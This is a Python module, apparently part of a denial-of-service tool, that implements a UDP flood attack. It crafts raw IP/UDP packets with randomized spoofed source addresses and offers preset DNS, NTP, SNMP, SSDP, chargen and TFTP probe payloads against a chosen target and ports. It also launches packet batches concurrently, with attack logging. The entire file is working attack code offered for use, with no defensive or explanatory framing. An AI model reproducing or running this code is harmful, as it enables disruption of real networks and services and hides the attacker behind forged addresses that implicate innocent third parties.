import asyncio
import socket
import random
import struct
from core.logger import attack_start, attack_summary, attack_warning

PRESET_PAYLOADS = {
    "dns": b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01",
    "ntp": b"\x1b" + b"\x00" * 47,
    "chargen": b"\x00",
    "snmp": b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x1b\x02\x04" + bytes(random.randint(0, 255) for _ in range(15)),
    "ssdp": b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n",
    "tftp": b"\x00\x01test.txt\x00octet\x00",
    "flood": lambda size: random.randbytes(size)
}

def generate_packet(technique, size):
    if technique == "flood":
        return PRESET_PAYLOADS["flood"](size)
    return PRESET_PAYLOADS.get(technique, b"X" * size)

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def create_spoofed_packet(src_ip, dst_ip, dst_port, payload):
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69, 0, 20 + 8 + len(payload), random.randint(0, 65535), 0, 255,
        socket.IPPROTO_UDP, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
    )
    udp_header = struct.pack('!HHHH', random.randint(1024, 65535), dst_port, 8 + len(payload), 0)
    return ip_header + udp_header + payload

async def udp_attack(user_id, target_ip, ports, count, iterations, spoof=False, technique="flood"):
    """
    :param target_ip: IP адрес цели
    :param ports: список портов
    :param count: пакетов на итерацию
    :param iterations: сколько раз повторить атаку
    :param spoof: включить подмену IP
    :param technique: flood | dns | ntp | ssdp и т.д.
    """
    attack_id = random.randint(1000, 9999)
    total = count * iterations
    attack_start(user_id, attack_id, "udp", target_ip, total, spoof=spoof)

    ports = ports or [80]
    tasks = []
    start = asyncio.get_event_loop().time()

    for _ in range(iterations):
        tasks.append(asyncio.create_task(run_udp_batch(target_ip, ports, count, spoof, technique, attack_id)))

    await asyncio.gather(*tasks)
    duration = asyncio.get_event_loop().time() - start
    attack_summary(user_id, attack_id, "udp", target_ip, total, total, duration)

async def run_udp_batch(ip, ports, count, spoof, technique, attack_id):
    try:
        if spoof:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception:
        attack_warning(attack_id, "udp", ip)
        return

    for _ in range(count):
        port = random.choice(ports)
        size = random.randint(100, 1024)
        data = generate_packet(technique, size)

        try:
            if spoof:
                fake_ip = random_ip()
                packet = create_spoofed_packet(fake_ip, ip, port, data)
                sock.sendto(packet, (ip, port))
            else:
                sock.sendto(data, (ip, port))
        except Exception:
            attack_warning(attack_id, "udp", f"{ip}:{port}")

        await asyncio.sleep(random.uniform(0.01, 0.05))

    sock.close()